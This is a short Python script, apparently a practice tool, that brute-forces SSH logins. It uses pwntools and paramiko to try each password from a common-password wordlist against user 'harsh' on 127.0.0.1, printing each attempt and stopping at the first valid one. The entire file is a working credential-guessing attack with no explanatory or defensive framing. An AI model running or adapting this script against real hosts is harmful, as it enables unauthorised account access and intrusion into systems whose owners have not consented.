from pwn import ssh
import paramiko

host = "127.0.0.1"
username = "harsh"
attempts = 0

try:
    with open("ssh_common-password.txt", "r") as password_list:
        for password in password_list:
            password = password.strip()
            print(f"[{attempts}] Attempting password: '{password}'")
            try:
                response = ssh(host=host, user=username, password=password, timeout=1)
                if response.connected():
                    print(f"[+] Valid password found: '{password}'")
                    response.close()
                    break
                response.close()
            except paramiko.ssh_exception.AuthenticationException:
                print("[−] Invalid password.")
            except paramiko.ssh_exception.SSHException as e:
                print(f"[!] SSH error: {e}")
            attempts += 1
except FileNotFoundError:
    print("[!] Password file not found.")

